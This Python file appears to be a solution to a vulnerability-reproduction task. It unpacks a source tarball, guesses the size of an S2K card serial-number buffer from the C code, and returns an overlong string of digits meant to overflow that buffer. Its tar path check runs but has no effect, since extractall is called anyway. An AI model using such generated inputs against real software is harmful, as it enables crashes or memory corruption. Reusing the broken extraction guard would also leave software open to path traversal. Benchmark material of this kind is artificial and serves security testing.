import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_len = 128  # default length if we cannot infer anything

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                # Extract tarball
                try:
                    with tarfile.open(src_path, 'r:*') as tar:
                        def is_within_directory(directory, target):
                            abs_directory = os.path.abspath(directory)
                            abs_target = os.path.abspath(target)
                            prefix = os.path.commonprefix([abs_directory, abs_target])
                            return prefix == abs_directory

                        for member in tar.getmembers():
                            member_path = os.path.join(tmpdir, member.name)
                            if not is_within_directory(tmpdir, member_path):
                                continue
                        tar.extractall(tmpdir)
                except Exception:
                    # If extraction fails, fall back to default length
                    return self._make_payload(buf_len)

                inferred = self._infer_serial_buf_size(tmpdir)
                if inferred is not None and inferred > 0:
                    # Choose a length that is safely larger than the buffer size
                    # but not excessively large.
                    # Aim for something close-ish to inferred+8 to keep PoC small.
                    buf_len = inferred + max(8, inferred // 4)
                    if buf_len <= inferred:
                        buf_len = inferred + 1
                    if buf_len < 32:
                        buf_len = 32
                    if buf_len > 512:
                        buf_len = 512
        except Exception:
            # Any unexpected error: fall back to default
            buf_len = 128

        return self._make_payload(buf_len)

    def _make_payload(self, length: int) -> bytes:
        # Use only decimal digits to look like a plausible serial number
        base = b"0123456789"
        repeat = (length // len(base)) + 1
        payload = (base * repeat)[:length]
        return payload

    def _infer_serial_buf_size(self, root: str):
        candidate_sizes = []

        # Search for patterns suggesting the size of the S2K card serial buffer
        for dirpath, _, filenames in os.walk(root):
            for name in filenames:
                if not name.endswith(('.c', '.h', '.cpp', '.cxx', '.cc', '.hpp', '.hh', '.C', '.CPP')):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        text = f.read()
                except Exception:
                    continue

                lower_text = text.lower()
                if 's2k' not in lower_text and 's-2-k' not in lower_text:
                    # Heuristic: only inspect files mentioning s2k to narrow down
                    continue

                # Look for char arrays with "serial" in the name
                for m in re.finditer(r'\bchar\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]', text):
                    var, size_str = m.groups()
                    var_lower = var.lower()
                    if 'serial' in var_lower:
                        try:
                            val = int(size_str)
                        except ValueError:
                            continue
                        if 4 <= val <= 4096:
                            candidate_sizes.append(val)

                # Look for #define constants that combine s2k & serial in the name
                for m in re.finditer(r'#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(\d+)', text):
                    name_const, val_str = m.groups()
                    lname = name_const.lower()
                    if 's2k' in lname and 'serial' in lname:
                        try:
                            val = int(val_str)
                        except ValueError:
                            continue
                        if 4 <= val <= 4096:
                            candidate_sizes.append(val)

        if not candidate_sizes:
            return None
        # Use the smallest candidate; smaller buffers are more likely to be the vulnerable ones
        return min(candidate_sizes)